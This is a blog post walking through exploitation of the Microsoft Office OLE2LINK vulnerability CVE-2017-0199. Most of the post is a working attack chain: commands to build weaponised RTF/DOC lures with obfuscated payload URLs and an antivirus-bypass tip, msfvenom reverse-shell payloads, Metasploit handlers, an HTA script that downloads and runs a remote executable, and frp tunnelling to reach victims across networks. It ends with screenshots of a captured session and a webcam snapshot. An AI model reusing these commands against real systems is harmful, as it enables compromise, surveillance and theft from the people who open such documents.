<!DOCTYPE html>
<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><meta name="description" content="Preface
I‚Äôm so dizzy writing this after the graduation banquet!"><title>Exploiting OFFICE OLE2LINK (CVE-2017-0199)&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Exploiting OFFICE OLE2LINK (CVE-2017-0199)" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/en/"><span class="site name">Gorgias' Blog</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/en/categories/">Categories</a><a class="nav item" href="/en/tags/">Tags</a><a class="nav item" href="/en/about/">About</a><a class="nav item" href="/en/links/">Links</a><a class="nav item" href="/zh/posts/exploiting-cve-2017-0199/" title="‰∏≠Êñá">
            <span class="lang-icon">üåê</span>‰∏≠Êñá</a></nav></div></span></div></section><section id="content"><style>
     
    .toc-wrapper {
        position: fixed;
        bottom: 30px;
        right: 30px;
        z-index: 9999;
        display: flex;
        flex-direction: column-reverse;
        align-items: flex-end;
        gap: 10px;
    }

     
    .toc-button {
        background-color: #fff;
        color: #333;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        border: 1px solid #ddd;
        transition: transform 0.2s, box-shadow 0.2s;
    }

    .toc-button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
    }

    .toc-button svg {
        width: 24px;
        height: 24px;
        fill: currentColor;
    }

     
    .toc-content-box {
        background: #fff;
        border: 1px solid #eee;
        border-radius: 8px;
        padding: 15px;
        width: 250px;
        max-height: 60vh;
        overflow-y: auto;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        display: none;
         
        font-size: 0.9em;
        opacity: 0;
        transform: translateY(10px);
        transition: opacity 0.3s, transform 0.3s;
    }

    .toc-content-box.show {
        display: block;
        opacity: 1;
        transform: translateY(0);
    }

    .toc-header {
        font-weight: bold;
        border-bottom: 2px solid #f0f0f0;
        padding-bottom: 8px;
        margin-bottom: 8px;
        font-size: 1.1em;
    }

     
    #TableOfContents {
        text-align: left;
    }

    #TableOfContents ul,
    #TableOfContents ol {
        list-style: none;
        padding-left: 0;
        margin: 0;
    }

    #TableOfContents li {
        margin: 4px 0;
    }

    #TableOfContents ul ul,
    #TableOfContents ol ol {
        padding-left: 1em;
    }

    #TableOfContents a {
        text-decoration: none;
        color: #555;
        display: block;
        padding: 2px 0;
        transition: color 0.2s;
    }

    #TableOfContents a:hover {
        color: #007bff;
    }

     
    @media (prefers-color-scheme: dark) {
        .toc-button {
            background-color: #333;
            color: #ddd;
            border-color: #555;
        }

        .toc-content-box {
            background-color: #2a2a2a;
            border-color: #444;
            color: #ddd;
        }

        .toc-header {
            border-bottom-color: #444;
        }

        #TableOfContents a {
            color: #aaa;
        }

        #TableOfContents a:hover {
            color: #fff;
        }
    }
</style><div class="article-container"><section class="article header">
    <h1 class="article title">Exploiting OFFICE OLE2LINK (CVE-2017-0199)</h1><p class="article date">Sunday, May 7, 2017<span class="langs"><span class="lang">
                    <a href="/zh/posts/exploiting-cve-2017-0199/" title="‰∏≠Êñá">
                        <span class="lang-icon">üåê</span>‰∏≠Êñá</a>
                </span></span></p></section><article class="article markdown-body"><h2 id="preface">Preface</h2>
<p>I‚Äôm so dizzy writing this after the graduation banquet!</p>
<p>Last month, FireEye disclosed an Office 0day: simply opening a Word document could execute arbitrary code via an HTA script.</p>
<p>It may look a bit messy at first glance, so here‚Äôs a simplified overview of how the attack works:</p>
<blockquote>
<ol>
<li>The attacker sends the target user a Word document that embeds an OLE2LINK object.</li>
<li>When the user opens the document, <code>winword.exe</code> sends an HTTP request to a remote server and retrieves a malicious HTA (HTML Application) file. Due to incorrect handling of the <code>Content-Type</code> during object update over the network, the HTA gets executed.</li>
<li><code>winword.exe</code> queries the HTA file handler via a COM object, which causes Microsoft‚Äôs HTA application (<code>mshta.exe</code>) to load and execute the malicious HTA file.</li>
</ol>
</blockquote>
<h2 id="reproduction">Reproduction</h2>
<p>To reproduce it: write an HTA in VBScript, embed the HTA link into a Word document, then open it on the victim machine.
I don‚Äôt think I need to rewrite the whole walkthrough‚Äîthis post explains it in great detail:
<a href="http://www.duorenwei.com/news/5257.html"target="_blank" rel="noopener noreferrer">OFFICE OLE2LINKÔºàCVE-2017-0199ÔºâÊºèÊ¥ûÂà©Áî®ËØ¶Ëß£</a></p>
<h2 id="exploit-toolkit-cve-2017-0199">Exploit toolkit CVE-2017-0199</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/bhdresh/CVE-2017-0199
</span></span></code></pre></div><p>I recommend this tool. You don‚Äôt need to set up a server; it directly uses Python‚Äôs <code>socket</code> module to simulate one, which is very convenient.</p>
<p>By default it only supports an <code>.exe</code> payload. First generate the document‚Äîthe extension can be anything: <code>.rtf</code> works, <code>.doc</code> works too.
The <code>-u</code> parameter is the payload URL we use. It‚Äôs said that using the <code>.doc</code> extension helps bypass AV.
Add <code>-x</code> to obfuscate the content. For the obfuscation method, check the <code>generate_exploit_obfuscate_rtf</code> function; it mainly obfuscates the payload URI.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.92.1/logo.doc -x <span class="m">1</span>
</span></span></code></pre></div><h3 id="generate-payloads">Generate payloads</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.92.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe &gt; /home/gorgias/Tools/malware/rtf32.exe
</span></span></code></pre></div><h3 id="wait-for-the-reverse-shell">Wait for the reverse shell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.92.1; run&#34;</span>
</span></span></code></pre></div><h3 id="deliver-the-payloads">Deliver the payloads</h3>
<p>Run the following command. The default port is 8080. Use <code>-p</code> to set the port manually; use <code>-H</code> to run a specified script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python2 cve-2017-0199_toolkit.py -H test.hta -M exp -e http://192.168.92.1/shell.exe -l /home/gorgias/Tools/malware/rtf64.exe -p <span class="m">8000</span>
</span></span></code></pre></div><p>After the client opens the target document, it will run this script by default:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">a</span><span class="o">=</span>new ActiveXObject<span class="o">(</span><span class="s2">&#34;WScript.Shell&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">a.run<span class="o">(</span><span class="s1">&#39;%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\&#39;</span>http://yourpayloads.com/evil.exe<span class="se">\&#39;</span>, <span class="se">\&#39;</span>c:/windows/temp/shell.exe<span class="se">\&#39;</span><span class="o">)</span><span class="p">;</span> c:/windows/temp/shell.exe<span class="err">&#39;</span>, 0<span class="o">)</span><span class="p">;</span>window.close<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">&lt;/script&gt;
</span></span></code></pre></div><h2 id="msf-module">MSF Module</h2>
<p>You can also use the exploit module <code>office_word_hta</code>.
However, it‚Äôs limited in real-world scenarios because it‚Äôs too automated: from generating the payload to configuring the handler, everything is auto-configured. The callback IP is fixed, so you can‚Äôt easily use an internal-network tunneling approach to compromise hosts on an external network without modifying it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf &gt; use exploit/windows/fileformat/office_word_hta
</span></span></code></pre></div><p>Check the options‚Äîdescriptions are accurate, there aren‚Äôt many options, and it‚Äôs easy to configure:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf exploit<span class="o">(</span>office_word_hta<span class="o">)</span> &gt; options
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/windows/fileformat/office_word_hta<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   FILENAME  msf.doc          yes       The file name.
</span></span><span class="line"><span class="cl">   SRVHOST   0.0.0.0          yes       The <span class="nb">local</span> host to listen on. This must be an address on the <span class="nb">local</span> machine or 0.0.0.0
</span></span><span class="line"><span class="cl">   SRVPORT   <span class="m">8080</span>             yes       The <span class="nb">local</span> port to listen on.
</span></span><span class="line"><span class="cl">   SSL       <span class="nb">false</span>            no        Negotiate SSL <span class="k">for</span> incoming connections
</span></span><span class="line"><span class="cl">   SSLCert                    no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
</span></span><span class="line"><span class="cl">   URIPATH   default.hta      yes       The URI to use <span class="k">for</span> the HTA file
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Microsoft Office Word
</span></span></code></pre></div><p>Just <code>run</code> / <code>exploit</code> and it will switch to the background as a job. Both the HTA and DOC will be generated for you. Put the DOC on the victim machine and open it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf exploit<span class="o">(</span>office_word_hta<span class="o">)</span> &gt; exploit
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.
</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>office_word_hta<span class="o">)</span> &gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.1.177:4444
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> msf.doc stored at /home/gorgias/.msf4/local/msf.doc
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using URL: http://0.0.0.0:8080/default.hta
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Local IP: http://192.168.1.177:8080/default.hta
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Server started.
</span></span></code></pre></div><h2 id="practical-exploitation">Practical exploitation</h2>
<p>Here‚Äôs how to tunnel into an internal network for exploitation. First, find a server and install <code>frp</code> to proxy both the local payload and the reverse-shell port.
For installation, see: <a href="https://gorgias.me/2017/05/03/frp%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"target="_blank" rel="noopener noreferrer">FRP ‰ΩøÁî®Á¨îËÆ∞</a></p>
<p>frp config:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>rev<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">privilege_mode</span> <span class="o">=</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nb">type</span> <span class="o">=</span> tcp
</span></span><span class="line"><span class="cl"><span class="nv">local_ip</span> <span class="o">=</span> 0.0.0.0
</span></span><span class="line"><span class="cl"><span class="nv">local_port</span> <span class="o">=</span> <span class="m">4445</span>
</span></span><span class="line"><span class="cl"><span class="nv">remote_port</span> <span class="o">=</span> <span class="m">4445</span>
</span></span></code></pre></div><p>Use <code>msfvenom</code> to generate the HTA payload. Here we use a PowerShell-type payload and obfuscate it with base64:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>45.32.42.185 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4445</span> -e cmd/powershell_base64 -f hta-psh &gt; /home/gorgias/Tools/malware/frp.hta
</span></span></code></pre></div><p>Wait for the callback:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4445; run&#34;</span>
</span></span></code></pre></div><p>Generate the document:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 cve-2017-0199_toolkit.py -M gen -w ÁéãÂ∏àÂÇÖÁöÑÁÖßÁâá.doc -u http://frp.gorgiaxx.me:8000/photo.doc -x <span class="m">1</span>
</span></span></code></pre></div><p>If you use a custom HTA, you don‚Äôt necessarily need to use an <code>.exe</code> payload. Just listen on the port:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python2 cve-2017-0199_toolkit.py -M exp -H frp.hta -p <span class="m">8080</span>
</span></span></code></pre></div><p><img loading="lazy"  src="./gen.png"
        alt="gen"/>
Then have a victim (with a vulnerable Office version installed) open the DOC.
You should then get a session:
<img loading="lazy"  src="./meterpreter.png"
        alt="meterpreter"/>
<img loading="lazy"  src="./screenshot.jpeg"
        alt="screenshot"/>
<img loading="lazy"  src="./cam_snap.jpeg"
        alt="cam_snap"/></p>
<h2 id="reference">Reference</h2>
<p><a href="http://www.91ri.org/16953.html"target="_blank" rel="noopener noreferrer">CVE-2017-0199ÊºèÊ¥ûÂ§çÁé∞ËøáÁ®ã</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/26522540"target="_blank" rel="noopener noreferrer">ÂØπCVE-2017-0199ÁöÑ‰∏ÄÊ¨°Â§çÁé∞ËøáÁ®ã‰∏éÂÜÖÁΩëÁ©øÈÄèÁöÑÂà©Áî®</a></p>
<p><a href="http://www.4hou.com/technology/4260.html"target="_blank" rel="noopener noreferrer">CVE-2017-0199‚Äî‚ÄîÈ¶ñ‰∏™Microsoft Office RTFÊºèÊ¥û</a></p>
<p><a href="http://www.duorenwei.com/news/5257.html"target="_blank" rel="noopener noreferrer">OFFICE OLE2LINKÔºàCVE-2017-0199ÔºâÊºèÊ¥ûÂà©Áî®ËØ¶Ëß£</a></p>
<p><a href="http://securityaffairs.co/wordpress/58077/breaking-news/cve-2017-0199-exploitation-poc.html"target="_blank" rel="noopener noreferrer">Windows attacks via CVE-2017-0199 ‚Äì Practical exploitation! (PoC)</a></p>
</article><section class="article labels"><a class="category" href=/en/categories/cybersecurity/>Cybersecurity</a><a class="tag" href=/en/tags/rtf/>RTF</a><a class="tag" href=/en/tags/cve-2017-0199/>CVE-2017-0199</a></section>
</div>

<div class="toc-wrapper">
    <div class="toc-content-box" id="toc-content-box">
        <div class="toc-header">Table of Contents</div>
        <nav id="TableOfContents">
  <ol>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#reproduction">Reproduction</a></li>
    <li><a href="#exploit-toolkit-cve-2017-0199">Exploit toolkit CVE-2017-0199</a>
      <ol>
        <li><a href="#generate-payloads">Generate payloads</a></li>
        <li><a href="#wait-for-the-reverse-shell">Wait for the reverse shell</a></li>
        <li><a href="#deliver-the-payloads">Deliver the payloads</a></li>
      </ol>
    </li>
    <li><a href="#msf-module">MSF Module</a></li>
    <li><a href="#practical-exploitation">Practical exploitation</a></li>
    <li><a href="#reference">Reference</a></li>
  </ol>
</nav>
    </div>
    <div class="toc-button" onclick="toggleTOC()" title="">
        
        <svg viewBox="0 0 24 24">
            <path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"></path>
        </svg>
    </div>
</div>

<script>
    function toggleTOC() {
        const tocBox = document.getElementById('toc-content-box');
        if (tocBox.classList.contains('show')) {
            tocBox.classList.remove('show');
            
            
            
            
            
            setTimeout(() => {
                tocBox.style.display = 'none';
            }, 300); 
        } else {
            tocBox.style.display = 'block';
            
            void tocBox.offsetWidth;
            tocBox.classList.add('show');
        }
    }

    
    document.addEventListener('click', function (event) {
        const wrapper = document.querySelector('.toc-wrapper');
        const tocBox = document.getElementById('toc-content-box');
        if (wrapper && !wrapper.contains(event.target) && tocBox.classList.contains('show')) {
            toggleTOC();
        }
    });
</script><div class="article bottom"><section class="article navigation"><p><a class="link" href="/en/posts/d-link-dir-850l-router-vulnerability-report/"><span class="iconfont icon-article"></span>D-Link DIR-850L Router Vulnerability Verification Report</a></p><p><a class="link" href="/en/posts/frp-notes/"><span class="iconfont icon-article"></span>FRP Usage Notes</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
            CC BY-NC-SA 4.0
        </a>
        (Attribution-NonCommercial-ShareAlike).
    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>

</html>